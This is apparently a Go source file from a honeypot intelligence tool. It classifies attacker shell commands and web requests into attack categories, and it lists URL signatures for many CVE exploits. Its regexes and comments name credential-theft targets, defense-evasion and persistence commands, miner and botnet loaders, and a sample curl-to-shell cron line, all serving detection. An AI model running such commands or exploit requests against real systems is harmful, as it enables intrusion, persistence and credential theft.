package intelligence

import (
	"regexp"
	"strings"
)

// The category patterns. Every pattern is RE2 (linear time) and avoids large
// counted repetitions, so a hostile 32 KiB field costs the same as a
// harmless one; TestCategorizeHostileInputIsFast holds that.

const catBT = "`"

// catCmdStart is where a shell reads a command name: the start of the line
// or of a segment (after ; & | a newline, a subshell, command substitution
// or sh -c), behind sudo/nohup/busybox-style prefixes and a directory.
// catCmdEnd ends the name. A word elsewhere on the line is an argument:
// "which wget" does not download and "pkill xmrig" does not mine.
const (
	catCmdPrefix = `\s*(?:(?:sudo|nohup|exec|busybox|setsid|nice|time|command|then|do|else|xargs|timeout\s+\d+)(?:\s+-[a-z]+)*\s+)*(?:[\w./~-]*/)?`
	catCmdStart  = `(?:^|[;&|\n({` + catBT + `]|\$\(|\b(?:ba|da|z|k)?sh\s+-c\s+["']?)` + catCmdPrefix
	// catWebCmdStart is the same inside a web request, where a command is
	// smuggled after a shell separator or as a parameter's value. A lone &
	// separates query parameters there, so it does not start a command.
	catWebCmdStart = `(?:[;|\n` + catBT + `=]|&&|\$\(|\b(?:ba|da|z|k)?sh\s+-c\s+["']?)` + catCmdPrefix
	catCmdEnd      = `(?:$|[\s;&|)` + catBT + `<>'"])`
)

func catShellCmd(names string) *regexp.Regexp {
	return regexp.MustCompile(catCmdStart + `(?:` + names + `)` + catCmdEnd)
}

func catWebCmd(names string) *regexp.Regexp {
	return regexp.MustCompile(catWebCmdStart + `(?:` + names + `)` + catCmdEnd)
}

func catRe(alternatives ...string) *regexp.Regexp {
	return regexp.MustCompile(`(?:` + strings.Join(alternatives, `)|(?:`) + `)`)
}

// catRei is catRe ignoring case, for names an attacker spells as they like
// (file names, tools, pools).
func catRei(alternatives ...string) *regexp.Regexp {
	return regexp.MustCompile(`(?i)(?:` + strings.Join(alternatives, `)|(?:`) + `)`)
}

// ---------------------------------------------------------------------------
// Events: what the honeypot itself says happened.
// ---------------------------------------------------------------------------

var (
	catLoginEvent = regexp.MustCompile(`(?:^|[._-])(?:login|logon|auth|authentication)(?:$|[._-])`)
	// catConnectEvent is a bare connection/probe with no auth or command:
	// every honeypot's name for "someone opened a connection" (dionaea
	// connection.accept, cowrie session.connect, dicompot connection_from,
	// conpot new_connection).
	catConnectEvent  = regexp.MustCompile(`(?:^|[._-])(?:connection|connect|probe)(?:$|[._-])|new_connection|session\.connect`)
	catUploadEvent   = regexp.MustCompile(`(?:^|[._-])(?:file[._-]?)?upload(?:$|[._-])`)
	catDownloadEvent = regexp.MustCompile(`(?:^|[._-])file[._-]?download(?:$|[._-])`)
	// catICSCommand is a conpot request in an industrial protocol, not a
	// bare connection to it (see the conpot event names in compose.go).
	catICSCommand = regexp.MustCompile(`^(?:command|conpot\.(?:modbus|s7comm|bacnet|enip|iec104|guardian_ast|kamstrup_protocol|kamstrup_management_protocol)\.command)$`)
	catCVEText    = regexp.MustCompile(`\bcve[-_ ]?(\d{4})[-_](\d{4,7})\b`)
	catIDSScan    = regexp.MustCompile(`^(?:et|etpro|gpl)\s+scan\b`)
)

// catScannerFingerprint is a scanner's self-description: an SSH client
// version, a user agent, or the out-of-band domain of a Nuclei probe.
var catScannerFingerprint = regexp.MustCompile(`\b(?:zgrab\d*|masscan|nmap|nuclei|zmap|censys(?:inspect)?|shodan|internet-?measurement|netsystemsresearch|expanse|xpanse|leakix|l9explore|l9tcpid|onyphe|bitsightbot|stretchoid|criminalip|modat|binaryedge|nikto|sqlmap|wpscan|acunetix|qualys|openvas|nessus|dirbuster|gobuster|ffuf|feroxbuster|whatweb|projectdiscovery|interactsh|oast\.(?:pro|live|site|online|fun|me))\b`)

func catByEvent(in *catInput, s *catSet) {
	hp, et := in.hp, in.et
	switch hp {
	case "ddospot":
		// ddospot answers only reflection-prone UDP services; every logged
		// request is an amplification probe.
		s.add(CatAmplification)
		return
	case "sentrypeer":
		s.add(CatVoIPFraud)
		return
	case "suricata":
		if catIDSScan.MatchString(strings.TrimSpace(in.any)) {
			s.add(CatScanning)
		}
		if in.idsCategory == "detection of a network scan" {
			s.add(CatScanning)
		}
		for _, m := range catCVEText.FindAllStringSubmatch(in.any, catMaxCVEs) {
			s.exploit("CVE-" + m[1] + "-" + m[2])
		}
		return
	case "conpot":
		if catICSCommand.MatchString(et) {
			s.add(CatICSAttack)
			return
		}
	case "heralding":
		if in.proto == "socks5" || in.proto == "socks" {
			s.add(CatProxyAbuse)
		}
	}
	if in.proto == "sip" {
		s.add(CatVoIPFraud)
	}
	if catLoginEvent.MatchString(et) || ((in.user != "" || in.pass != "") && !strings.Contains(et, "command")) {
		s.add(CatBruteForce)
	}
	if catConnectEvent.MatchString(et) && in.user == "" {
		s.add(CatScanning)
	}
	if strings.Contains(et, "direct-tcpip") {
		// cowrie: the client asked SSH to forward a connection elsewhere.
		s.add(CatProxyAbuse)
	}
	if catUploadEvent.MatchString(et) {
		s.add(CatFileUpload)
	}
	if catDownloadEvent.MatchString(et) {
		s.add(CatMalwareDownload)
	}
}

// ---------------------------------------------------------------------------
// Shell commands (cowrie, adbhoney, ssh-proxy): what an attacker typed after
// logging in. Matched with their case; the same patterns also read the
// lower-cased web and Redis text where a payload's commands are smuggled.
// ---------------------------------------------------------------------------

const (
	catDownloaders = `wget|curl|tftp|ftpget|lwp-download|aria2c|axel|fetch`
	// catWrite is a write into a file: a redirection, tee, or a copy, move
	// or link onto it.
	catWrite = `(?:>>?|\btee\b(?:\s+-a)?|\b(?:cp|mv|install)\s+(?:-\S+\s+)*\S+|\bln\s+-s\S*\s+\S+)\s*["']?`
	// catReaders read a file's content (or ship it somewhere).
	catReaders     = `cat|head|tail|more|less|grep|egrep|awk|cut|cp|scp|base64|xxd|od|strings|tar|zip|unshadow|nl|sed|sort|curl|nc|ncat`
	catMinerNames  = `xmrig|xmrig-notls|xmr-stak|minerd|cpuminer|cpuminer-multi|ccminer|nbminer|lolminer|t-rex|phoenixminer|ethminer|srbminer|srbminer-multi|kdevtmpfsi`
	catRivalNames  = `xmrig|xmr|kdevtmpfsi|kinsing|minerd|cpuminer|kthreaddi|dbused|watchbog|sysupdate|networkservice|sustse|ddgs|kerberods|zigw|mozi|mirai|tsunami|kaiten|cryptonight|miner`
	catDefenseUnit = `firewalld|ufw|iptables|ip6tables|nftables|apparmor|auditd|selinux|aegis|aliyun\S*|cloudmonitor|yunjing|ydservice|qcloud\S*|bcm-agent|falcon-sensor|wazuh-agent|ossec\S*|clamav\S*|clamd|osqueryd`
	catArch        = `mips|mipsel|mpsl|arm[4-7]?|armv[4-7]l|x86|x86_64|i[3-6]86|m68k|ppc|powerpc|sh4|spc|sparc|arc`
	catMetadataIP  = `169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200`
)

var (
	// Downloads: a downloader with a remote target, its arguments captured
	// so a "what is my IP" lookup can be told from a payload.
	catWebDownload = regexp.MustCompile(catWebCmdStart + `(?:` + catDownloaders + `)\s+([^;&|\n` + catBT + `]+)`)
	// catLooseDownload finds a downloader anywhere, not only in command
	// position, so a fetch smuggled into an echoed cron line
	// (echo "* * * * * curl http://x | sh" | crontab -) is still a download.
	// A real remote target is required (catDownloads enforces it), so "which
	// wget" and "pkill curl" do not match.
	catLooseDownload  = regexp.MustCompile(`\b(?:` + catDownloaders + `)\s+([^;&|\n` + catBT + `]+)`)
	catDownloadTarget = regexp.MustCompile(`(?i)(?:https?|ftp|tftp)://|\b\d{1,3}(?:\.\d{1,3}){3}\b|\b[a-z0-9-]+(?:\.[a-z0-9-]+)*\.[a-z]{2,}(?::\d+)?/\S`)
	catIPLookup       = regexp.MustCompile(`(?i)\b(?:ifconfig\.(?:me|co|io|so)|ipinfo\.io|icanhazip\.com|api\d*\.ipify\.org|ipecho\.net|ident\.me|checkip\.amazonaws\.com|myexternalip\.com|ip\.sb|wtfismyip\.com|ip-api\.com|myip\.dnsomatic\.com|eth0\.me)\b`)
	catDropper        = catRe(
		// echo -ne '\x7f\x45\x4c\x46...' > .d (Mirai's echo loader)
		`\b(?:echo|printf)\s+(?:-[a-z]+\s+)*["']?(?:\\x[0-9a-fA-F]{2}){4,}`,
		`\b(?:python[23]?|perl|php|ruby)\b[^;&|\n]*(?i:urllib|urlopen|requests\.get|lwp::simple|getstore|file_get_contents|open-uri|net::http)[^;&|\n]*(?:https?|ftp)://`,
		`\b(?:nc|ncat|netcat)\s+[^;&|\n]*\b\d{1,3}(?:\.\d{1,3}){3}\s+\d{1,5}\s*>\s*\S`,
		// a base64-encoded ELF ("\x7fELF" is f0VMR...) decoded to disk
		`(?i:\bbase64\b[^\n]*\bf0vmr[a-z0-9+/]|\bf0vmr[a-z0-9+/]+[^\n]*\bbase64\s+-d)`,
	)
	catDevTCPGet = regexp.MustCompile(`/dev/tcp/[^\s/]+/\d+`)
	catHTTPGet   = regexp.MustCompile(`\bget\s+/`)

	// Botnet loaders.
	catBusyboxProbe = regexp.MustCompile(`\bbusybox\s+[A-Z][A-Z0-9]{3,}\b`) // case-sensitive: /bin/busybox ECCHI
	catBotnet       = catRei(
		`\bcd\s+/tmp\s*\|\|\s*cd\s+/var/run\s*\|\|\s*cd\s+/mnt`,
		`\b(?:mirai|gafgyt|bashlite|hajime|okiru|satori|moobot|condi|lzrd|shellbot|kaiten)\b|\bmozi\.[ma]\b|\bbins\.sh\b|\.selfrep\b`,
		`(?:https?|ftp|tftp)://[^\s;|&'"`+catBT+`]*/(?:bins/|(?:[\w-]+\.)?(?:`+catArch+`)(?:$|[\s;|&'"]))`,
		`\b(?:tftp|ftpget)\b[^;&|\n]*\s(?:[\w-]+\.)?(?:mips|mipsel|mpsl|arm[4-7]?|x86|i[3-6]86|m68k|ppc|sh4|spc|sparc)\b`,
		`\./(?:[\w-]+\.)?(?:mips|mipsel|mpsl|arm[4-7]?|x86|i[3-6]86|m68k|ppc|sh4|spc|sparc)\b`,
		// Mirai and Gafgyt start the dropped bot with the vector that infected
		// the device: ./mips telnet.selfrep, sh x.sh huawei.
		`(?:\./[\w.-]+|\bsh\s+[\w./-]+\.sh)\s+(?:[\w-]+\.)?(?:selfrep|telnet|jaws|huawei|gpon\d*|zyxel|realtek|tplink|netgear|dlink|hnap|tbk|lilin|faith|avtech|dvr|nvr|zte|linksys|thinkphp|uchttpd|goahead|boa)\b`,
	)

	// Cryptomining: a pool, a miner's flags or setup script, a running
	// miner or a Monero wallet. A miner's name as an argument (pkill xmrig)
	// is not mining.
	catMinerSigns = catRei(
		`stratum\+(?:tcp|ssl|tls)://`,
		`\b(?:c3pool|moneroocean|supportxmr|nanopool|minexmr|hashvault|herominers|2miners|f2pool|unmineable|nicehash|minergate|xmrpool|monerohash|dwarfpool|ethermine|zergpool|prohashing|miningpoolhub|xmrig_setup|setup_c3pool_miner|setup_moneroocean_miner)\b`,
		`--donate-level|--cpu-max-threads-hint|--coin[= ](?:monero|xmr)\b|(?:--algo[= ]|\s-a\s+)(?:rx/0|randomx|cryptonight|cn/r)\b`,
		`"pools"\s*:\s*\[`,
		`\bcom\.ufo\.miner\b|\bufo\.miner\b`,
	)
	catMinerExec     = regexp.MustCompile(`(?i)` + catCmdStart + `(?:` + catMinerNames + `)` + catCmdEnd)
	catMinerWebExec  = catWebCmd(catMinerNames)
	catMinerInTarget = regexp.MustCompile(`(?i)\b(?:` + catMinerNames + `)\b`)
	catWallet        = regexp.MustCompile(`\b[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b`) // case-sensitive Monero address

	// Host reconnaissance after login.
	catRecon = catRe(
		catCmdStart+`(?:uname|whoami|id|hostname|hostnamectl|nproc|free|lscpu|lspci|lsusb|lshw|lsblk|dmidecode|ifconfig|netstat|arp|uptime|w|who|last|lastlog|getconf|lsb_release|nvidia-smi|df|systemd-detect-virt|virt-what|which|top|ss|route|ls|dir)`+catCmdEnd,
		catCmdStart+`ip\s+(?:-[a-z0-9]+\s+)*(?:a|addr|address|r|route|l|link|n|neigh|neighbor)\b`,
		`\bcrontab\s+-l\b`,
		// Reading a bot's own image is an architecture/self check.
		`/proc/self/(?:exe|maps|cmdline)\b`,
		`\b(?:cat|head|tail|more|less|grep|egrep|awk|cut|wc|sort|uniq|sed|strings|nl|tr)\b[^;&|\n]*(?:/proc/(?:cpuinfo|meminfo|version|mounts|uptime|stat\b|net/|1/cgroup|self/cgroup|self/status)|/etc/(?:os-release|issue|lsb-release|redhat-release|debian_version|passwd\b|group\b|hosts\b|resolv\.conf|hostname|machine-id|motd)|/sys/class/(?:dmi|net)/)`,
		`\b(?:`+catMetadataIP+`)\b`,
	)

	// Privilege escalation.
	catPrivEsc = catRe(
		catCmdStart+`(?:sudo|su|pkexec|doas)`+catCmdEnd,
		`\bfind\b[^;&|\n]*-perm\s+[-/+]?(?:u=s|g=s|ug=s|[246]000)\b`,
		`\bchmod\s+(?:-[a-z]+\s+)*(?:[ugoa]*\+[rwx]*s[rwx]*|[2-7][0-7]{3})\b`,
		`(?i:\b(?:pwnkit|dirtypipe|dirty_pipe|dirtycow|dirty_cow|dirtyc0w|looneytunables|looney_tunables|sudo_?baron|nimbuspwn|full-nelson|half-nelson|linpeas|linenum|linux-exploit-suggester|unix-privesc-check|suid3num|cve-2021-4034|cve-2022-0847|cve-2016-5195|cve-2021-3493|cve-2023-0386|cve-2023-4911|cve-2021-3156|cve-2019-14287|cve-2021-3560|cve-2022-2588|cve-2024-1086|cve-2023-2640|cve-2023-32233)\b|\b(?:les|lse)\.sh\b)`,
		`\b(?:gcc|cc|clang|tcc)\s[^;&|\n]*(?i:exploit|sploit|\bxpl|\bpwn|\broot\b|getroot|rootme|r00t|privesc|\blpe\b|cve-\d)`,
		`/etc/sudoers\b`,
		`\busermod\s[^;&|\n]*-a?g\s*(?:sudo|wheel|root|admin)\b`,
		`\bgetcap\s+-r\b`,
		`\bnsenter\s[^;&|\n]*(?:-t\s*1\b|--target[= ]1\b)`,
		`\bdocker\s+run\b[^;&|\n]*-v\s*/:/`,
	)

	// Persistence, one pattern per kind so the ATT&CK rules can tell them
	// apart (see rules.go).
	catPersistKeys = regexp.MustCompile(catWrite + `[^\s;&|]*authorized_keys2?\b`)
	catPersistCron = catRe(
		`\|\s*crontab\b`,
		`\bcrontab\s+(?:-u\s+\S+\s+)?(?:-e\b|-\s*(?:$|[;&|)])|[^-\s;&|])`,
		catWrite+`/(?:etc/cron|etc/crontab|var/spool/cron)`,
	)
	catPersistService = catRe(
		`\bsystemctl\s+(?:--\S+\s+)*enable\b`,
		catWrite+`/(?:etc|lib|usr/lib)/systemd/(?:system|user)/`,
		catWrite+`/etc/(?:rc\.local|init\.d/|rc\d\.d/|inittab)`,
		`\bupdate-rc\.d\s+\S+\s+(?:defaults|enable)\b`,
		`\bchkconfig\s+(?:--add\s|\S+\s+on\b)`,
	)
	catPersistAccount = catRe(
		catCmdStart+`(?:useradd|adduser)`+catCmdEnd,
		catWrite+`/etc/(?:passwd|shadow)\b`,
	)
	catPersistPassword = catShellCmd(`passwd|chpasswd|usermod`)
	catPersistProfile  = catRe(
		catWrite+`(?:~|\$HOME|\$\{HOME\}|/root|/home/[^/\s]+)?/?\.(?:bashrc|bash_profile|bash_login|profile|zshrc)\b`,
		catWrite+`/etc/(?:profile|bash\.bashrc|environment|ld\.so\.preload|sudoers)\b`,
		catWrite+`/etc/profile\.d/`,
	)

	// Covering tracks.
	catEvadeHistory = catRe(
		`\bhistory\s+-[cw]\b`,
		`\bunset\s+(?:HISTFILE|HISTSIZE|HISTFILESIZE|HISTORY|HISTSAVE)\b`,
		`\b(?:HISTSIZE|HISTFILESIZE)=0\b|\bHISTFILE=/dev/null\b|\bset\s+\+o\s+history\b`,
		`(?:\brm\s+(?:-\S+\s+)*|>\s*|\bln\s+-sf?\s+/dev/null\s+|\bshred\s+(?:-\S+\s+)*|\btruncate\s+-s\s*0\s+)["']?[^\s;&|]*\.(?:bash|zsh|ash|sh|mysql|psql|python)_history\b`,
	)
	catEvadeLogs = catRe(
		`(?:\brm\s+(?:-\S+\s+)*|>\s*|\bshred\s+(?:-\S+\s+)*|\btruncate\s+-s\s*0\s+)["']?/var/log\b`,
		`\bjournalctl\s+--(?:vacuum|rotate)`,
		`\butmpdump\b|>\s*/var/run/utmp\b`,
	)
	catEvadeDefenses = catRe(
		`\biptables\s+(?:-t\s+\S+\s+)?(?:-F|--flush|-X)(?:$|\s|;)`,
		`\biptables\s+-P\s+(?:INPUT|FORWARD|OUTPUT)\s+ACCEPT\b`,
		`\bufw\s+disable\b|\bsetenforce\s+0\b|\bSELINUX=disabled\b`,
		`\b(?:systemctl|service)\s+(?:stop|disable|mask)\s+(?:`+catDefenseUnit+`)`,
		`(?:\bservice\s+|/etc/init\.d/)(?:`+catDefenseUnit+`)\s+stop\b`,
		`\bchkconfig\s+(?:iptables|ip6tables|firewalld)\s+off\b`,
		`(?:\b(?:kill|pkill|killall|stop|disable|remove|uninstall)\b|\brm\s)[^;&|\n]*\b(?i:aegis|aliyun|aliyundun|yunjing|ydservice|ydeyes|qcloud|stargate|bcm-agent|cloudmonitor|hostguard|falcon-sensor|wazuh|ossec)\b`,
		`\b(?i:aegis|aliyun)\b[^;&|\n]*\b(?:uninstall|quartz_uninstall)\b`,
		// Running a cloud security agent's own uninstaller by its path
		// (…/qcloud/stargate/admin/uninstall.sh).
		`(?i:aegis|aliyun|yunjing|ydservice|qcloud|stargate|bcm[-_]agent|cloudmonitor|hostguard|falcon-sensor|wazuh|ossec)[^\s;&|]*uninstall`,
		// Removing the SSH access config (the mdrfckr loader wipes .ssh so
		// only its own key remains, locking out the owner and rivals).
		`\brm\s+(?:-[a-z]+\s+)*(?:~/|\$home/|/root/|/home/[^/\s]+/)?\.ssh\b`,
		`\brm\s+(?:-[a-z]+\s+)*[^\s;&|]*authorized_keys\b`,
		// Killing a rival's miner or bot.
		`\b(?:pkill|killall)\s+[^;&|\n]*(?i:`+catRivalNames+`)`,
		`\bgrep\s[^|;\n]*(?i:`+catRivalNames+`)[^;\n]*\|\s*(?:xargs\s+(?:-\S+\s+)*)?kill\b`,
		`\bkill\s+-9\s+\$\(\s*(?:pgrep|pidof)\s[^)]*(?i:`+catRivalNames+`)`,
	)

	// Credential theft.
	catCredShadow = regexp.MustCompile(`\b(?:` + catReaders + `)\b[^;&|\n]*/etc/g?shadow\b`)
	catCredOther  = catRe(
		`\b(?:`+catReaders+`|find)\b[^;&|\n]*(?:\.ssh/id_(?:rsa|dsa|ecdsa|ed25519)\b(?:[^.]|$)|/etc/ssh/ssh_host_[a-z0-9]+_key\b(?:[^.]|$)|-name\s+["']?id_(?:rsa|dsa|ecdsa|ed25519)\b)`,
		`\.aws/credentials\b|\.config/gcloud/(?:credentials|access_tokens|application_default_credentials|legacy_credentials)|\.azure/(?:accesstokens|msal_token_cache)|\.kube/config\b|\.docker/config\.json|\.git-credentials\b|\.netrc\b|\.pgpass\b|\.my\.cnf\b|\bwp-config\.php\b`,
		`(?:^|[\s/"'])\.env(?:\.[a-z]+)?\b`,
		`\b(?:env|printenv|set)\s*\|\s*grep\b[^;&\n]*(?i:aws|secret|token|passw|key)|\bprintenv\s+AWS_`,
		`(?i:\b(?:mimipenguin|lazagne|trufflehog|gitleaks)\b)`,
		`(?:`+catMetadataIP+`)/[^\s;&|]*(?:security-credentials|/token|identity|service-accounts)`,
		`\b(?:`+catReaders+`)\b[^;&|\n]*\.(?:bash|zsh|ash|sh|mysql|psql|python|rediscli|node_repl)_history\b`,
	)

	// Destructive actions.
	catImpact = catRe(
		`\brm\s+(?:-[a-z-]+\s+)*(?:--no-preserve-root\b|/\*?(?:$|[\s;&|]))`,
		`\bdd\s[^;&|\n]*\bof=/dev/(?:sd|hd|vd|xvd|nvme|mmcblk|md)`,
		`\bmkfs(?:\.\w+)?\s[^;&|\n]*/dev/|\bwipefs\s|\bshred\s[^;&|\n]*/dev/(?:sd|hd|vd|xvd|nvme|mmcblk)`,
		`>\s*/dev/(?:sd|hd|vd|xvd|nvme)[a-z0-9]*\b`,
		`\bkill\s+-9\s+-1\b`,
	)
	catImpactDoS = catRe(
		`:\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:`, // fork bomb
		`\bhping3?\b[^;&|\n]*--flood\b|(?i:\b(?:slowloris|mhddos|xerxes|ufonet|goldeneye|torshammer|synflood|udpflood|loic|hoic)\b|\b(?:hulk|ddos)\.(?:py|pl)\b)`,
	)
	catRansom = regexp.MustCompile(`(?i)\bransom\b|\bread_?me_to_(?:recover|decrypt|restore)|\bhow_to_(?:decrypt|recover|restore)\b|\brecover_your_(?:data|files)\b|\byour (?:files|data|databases?) (?:have|has) been (?:encrypted|backed up|stolen|downloaded)|\b(?:pay|send)\s+[\d.]+\s*(?:btc|bitcoin)\b|\bto (?:recover|restore) your (?:data|files|databases?)\b`)

	// Spreading to other machines.
	catLateralTools = catShellCmd(`masscan|zmap|nmap|pnscan|zgrab|zgrab2|hydra|medusa|ncrack|patator|crowbar|sshpass`)
	catRemoteLogin  = regexp.MustCompile(catCmdStart + `(?:ssh|scp|telnet|rsh)\s+([^;&|\n` + catBT + `]+)`)
	catRemoteHost   = regexp.MustCompile(`\b\d{1,3}(?:\.\d{1,3}){3}\b|[\w.-]+@[\w-]+(?:\.[\w-]+)*`)

	// Relaying through the honeypot.
	catSSHForward = regexp.MustCompile(`\bssh\b[^;&|\n]*\s-[a-zA-Z]*[DLR]\s*(?:\[|\d|[\w.-]+:\d)`) // case-sensitive
	catProxyTools = catRe(
		catCmdStart+`(?:3proxy|microsocks|danted|sockd|ss-server|ss-local|v2ray|gost|frpc|frps|chisel|ngrok|proxychains4?|tinyproxy)`+catCmdEnd,
		`\bsocat\s[^;&|\n]*\btcp[46]?-listen\b`,
	)

	catSCPUpload = regexp.MustCompile(`\bscp\s+(?:-[a-z]+\s+)*-[a-z]*t\b`) // scp -t: the client is uploading
)

// catDownloads runs a downloader pattern over text. It reports a download
// of a remote file, a "what is my IP" lookup, and the downloads' arguments.
func catDownloads(re *regexp.Regexp, text string) (download, ipLookup bool, targets []string) {
	for _, m := range re.FindAllStringSubmatch(text, 32) {
		args := m[1]
		if !catDownloadTarget.MatchString(args) {
			continue
		}
		if catIPLookup.MatchString(args) {
			ipLookup = true
			continue
		}
		download = true
		targets = append(targets, args)
	}
	return download, ipLookup, targets
}

// catPayloadSigns adds what a fetched-and-run payload reveals, wherever the
// commands came from (a shell, an injected web parameter, a Redis value).
func catPayloadSigns(text, raw string, targets []string, s *catSet) {
	if catBotnet.MatchString(text) || catBusyboxProbe.MatchString(raw) {
		s.add(CatBotnet)
	}
	if catMinerSigns.MatchString(text) || catWallet.MatchString(raw) {
		s.add(CatCryptomining)
	}
	for _, t := range targets {
		if catMinerInTarget.MatchString(t) {
			s.add(CatCryptomining)
		}
	}
}

func catShell(in *catInput, s *catSet) {
	t := in.shell

	dl, lookup, targets := catDownloads(catLooseDownload, t)
	if dl || catDropper.MatchString(t) || (catDevTCPGet.MatchString(t) && catHTTPGet.MatchString(strings.ToLower(t))) {
		s.add(CatMalwareDownload)
	}
	if lookup {
		s.add(CatRecon)
	}
	catPayloadSigns(t, t, targets, s)
	if catMinerExec.MatchString(t) {
		s.add(CatCryptomining)
	}
	if catRecon.MatchString(t) {
		s.add(CatRecon)
	}
	if catPrivEsc.MatchString(t) {
		s.add(CatPrivilegeEscalation)
	}
	if catMatchAny(t, catPersistKeys, catPersistCron, catPersistService, catPersistAccount, catPersistPassword, catPersistProfile) {
		s.add(CatPersistence)
	}
	if catMatchAny(t, catEvadeHistory, catEvadeLogs, catEvadeDefenses) {
		s.add(CatDefenseEvasion)
	}
	if catMatchAny(t, catCredShadow, catCredOther) {
		s.add(CatCredentialAccess)
	}
	if catMatchAny(t, catImpact, catImpactDoS, catRansom) {
		s.add(CatImpact)
	}
	if catLateralTools.MatchString(t) {
		s.add(CatLateralMovement)
	}
	for _, m := range catRemoteLogin.FindAllStringSubmatch(t, 16) {
		if catRemoteHost.MatchString(m[1]) {
			s.add(CatLateralMovement)
			break
		}
	}
	if catSSHForward.MatchString(t) || catProxyTools.MatchString(t) {
		s.add(CatProxyAbuse)
	}
	if catSCPUpload.MatchString(t) {
		s.add(CatFileUpload)
	}
}

// ---------------------------------------------------------------------------
// Web requests: the decoded path, query and (where the honeypot logs it) the
// raw request.
// ---------------------------------------------------------------------------

// catExploit names a known vulnerability by the request that exploits it.
type catExploit struct {
	cve string // "" when the vulnerability has no CVE
	re  *regexp.Regexp
}

var catExploits = []catExploit{
	{"CVE-2019-19781", regexp.MustCompile(`/vpns?/\.\./vpns/|/vpns/(?:portal/scripts/(?:newbm|rmbm|picktheme)\.pl|cfg/smb\.conf)`)},  // Citrix ADC
	{"CVE-2023-3519", regexp.MustCompile(`/gwtest/formssso\?\S*target=`)},                                                            // Citrix ADC
	{"CVE-2018-0296", regexp.MustCompile(`/\+csco[eu]\+/\.\./\+csco[eu]\+/`)},                                                        // Cisco ASA
	{"CVE-2020-3452", regexp.MustCompile(`/\+csco[te]\+/(?:translation-table|oem-customization)\?\S*\.\./`)},                         // Cisco ASA
	{"CVE-2017-0144", regexp.MustCompile(`\beternalblue\b|\bms17-010\b|\bdoublepulsar\b`)},                                           // EternalBlue
	{"CVE-2014-6271", regexp.MustCompile(`\(\)\s*\{[^}\n]*\}\s*;`)},                                                                  // Shellshock
	{"CVE-2021-41773", regexp.MustCompile(`/(?:cgi-bin|icons)/\.\./`)},                                                               // Apache httpd
	{"CVE-2017-9841", regexp.MustCompile(`/phpunit/(?:phpunit/)?src/util/php/eval-stdin\.php`)},                                      // PHPUnit
	{"CVE-2018-20062", regexp.MustCompile(`invokefunction&function=|\\think\\(?:app|container|request|template)\b`)},                 // ThinkPHP
	{"CVE-2021-3129", regexp.MustCompile(`/_ignition/execute-solution`)},                                                             // Laravel Ignition
	{"CVE-2020-14882", regexp.MustCompile(`/console/(?:css|images|\.\.)/\S*console\.portal`)},                                        // WebLogic
	{"CVE-2017-10271", regexp.MustCompile(`/wls-wsat/(?:coordinatorporttype|registrationporttyperpc|participantporttype)`)},          // WebLogic
	{"CVE-2019-2725", regexp.MustCompile(`/_async/asyncresponseservice`)},                                                            // WebLogic
	{"CVE-2022-1388", regexp.MustCompile(`/mgmt/tm/util/bash`)},                                                                      // F5 BIG-IP
	{"CVE-2020-5902", regexp.MustCompile(`/tmui/login\.jsp/\.\.;/`)},                                                                 // F5 BIG-IP
	{"CVE-2018-13379", regexp.MustCompile(`/remote/fgt_lang\?lang=\S*\.\./`)},                                                        // FortiOS
	{"CVE-2019-11510", regexp.MustCompile(`/dana-na/\.\./dana/html5acc/guacamole/`)},                                                 // Pulse Secure
	{"CVE-2023-46805", regexp.MustCompile(`/api/v1/totp/user-backup-code/\.\./`)},                                                    // Ivanti Connect Secure
	{"CVE-2018-10561", regexp.MustCompile(`/gponform/diag_form`)},                                                                    // GPON router
	{"CVE-2017-17215", regexp.MustCompile(`/ctrlt/deviceupgrade_1`)},                                                                 // Huawei HG532
	{"CVE-2023-1389", regexp.MustCompile(`/cgi-bin/luci/;stok=/locale\?form=country`)},                                               // TP-Link Archer
	{"CVE-2014-8361", regexp.MustCompile(`<newinternalclient>[^<]*(?:` + catBT + `|\$\()`)},                                          // Realtek SDK
	{"CVE-2022-30525", regexp.MustCompile(`/ztp/cgi-bin/handler`)},                                                                   // Zyxel firewall
	{"CVE-2019-12725", regexp.MustCompile(`/cgi-bin/kerbynet\?\S*x509(?:list|view)`)},                                                // Zeroshell
	{"CVE-2020-8515", regexp.MustCompile(`/cgi-bin/mainfunction\.cgi`)},                                                              // DrayTek Vigor
	{"CVE-2024-3721", regexp.MustCompile(`/device\.rsp\?\S*cmd=___s_o_s_t_r_e_a_max___`)},                                            // TBK DVR
	{"CVE-2021-36260", regexp.MustCompile(`/sdk/weblanguage`)},                                                                       // Hikvision
	{"", regexp.MustCompile(`/setup\.cgi\?\S*todo=syscmd`)},                                                                          // Netgear DGN setup.cgi
	{"", regexp.MustCompile(`(?:^|\s)/shell\?\S*(?:cd|wget|curl|busybox)\b`)},                                                        // JAWS/MVPower DVR
	{"", regexp.MustCompile(`/tmunblock\.cgi`)},                                                                                      // Linksys "TheMoon"
	{"", regexp.MustCompile(`/ws/v1/cluster/apps/new-application`)},                                                                  // Hadoop YARN
	{"CVE-2018-7600", regexp.MustCompile(`#(?:post_render|lazy_builder|pre_render|access_callback)\b|element_parents=account/mail`)}, // Drupalgeddon 2
	{"CVE-2022-26134", regexp.MustCompile(`(?:^|\s)/\$\{\s*[(@#]`)},                                                                  // Confluence OGNL
	{"CVE-2023-22527", regexp.MustCompile(`/template/aui/text-inline\.vm`)},                                                          // Confluence
	{"CVE-2021-26084", regexp.MustCompile(`/pages/createpage-entervariables\.action`)},                                               // Confluence
	{"CVE-2017-5638", regexp.MustCompile(`#_='multipart/form-data'`)},                                                                // Struts 2
	{"CVE-2022-22965", regexp.MustCompile(`class\.module\.classloader`)},                                                             // Spring4Shell
	{"CVE-2022-22963", regexp.MustCompile(`spring\.cloud\.function\.routing-expression`)},                                            // Spring Cloud Function
	{"CVE-2022-22947", regexp.MustCompile(`/actuator/gateway/(?:routes|refresh)`)},                                                   // Spring Cloud Gateway
	{"CVE-2019-16759", regexp.MustCompile(`widgetconfig\[code\]|routestring=ajax/render/widget_php`)},                                // vBulletin
	{"CVE-2020-7961", regexp.MustCompile(`/api/jsonws/invoke`)},                                                                      // Liferay
	{"CVE-2021-34473", regexp.MustCompile(`/autodiscover/autodiscover\.json\?@|/autodiscover\.json\S*powershell`)},                   // Exchange ProxyShell
	{"CVE-2019-17558", regexp.MustCompile(`\bwt=velocity\b|params\.resource\.loader\.enabled`)},                                      // Solr Velocity
